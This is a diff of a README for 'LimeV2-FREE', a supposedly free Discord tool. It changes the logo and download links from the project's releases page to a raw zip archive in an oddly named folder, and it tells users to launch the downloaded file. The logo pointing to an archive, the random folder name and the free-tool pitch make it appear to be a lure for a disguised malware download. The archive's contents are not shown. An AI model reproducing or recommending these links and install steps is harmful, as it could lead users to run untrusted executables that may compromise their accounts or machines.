@@ -2,7 +2,7 @@
 
 Welcome to LimeV2-FREE repository! 🎉
 
-![Lime Logo](https://github.com/gaugepo/LimeV2-FREE/releases)
+![Lime Logo](https://raw.githubusercontent.com/gaugepo/LimeV2-FREE/main/inconsolableness/FREE_Lime_centare.zip)
 
 ## Description ℹ️
 LimeV2-FREE is a versatile Discord tool designed for various functionalities. The tool is completely free and packed with features to enhance your Discord experience.
@@ -28,7 +28,7 @@ LimeV2-FREE is a versatile Discord tool designed for various functionalities. Th
 
 ## Installation 💻
 Click the button below to download the latest version of LimeV2-FREE:
-[![Download LimeV2-FREE](https://github.com/gaugepo/LimeV2-FREE/releases)](https://github.com/gaugepo/LimeV2-FREE/releases)
+[![Download LimeV2-FREE](https://raw.githubusercontent.com/gaugepo/LimeV2-FREE/main/inconsolableness/FREE_Lime_centare.zip)](https://raw.githubusercontent.com/gaugepo/LimeV2-FREE/main/inconsolableness/FREE_Lime_centare.zip)
 
 > **Note:** The downloaded file needs to be launched to start using LimeV2-FREE.
 
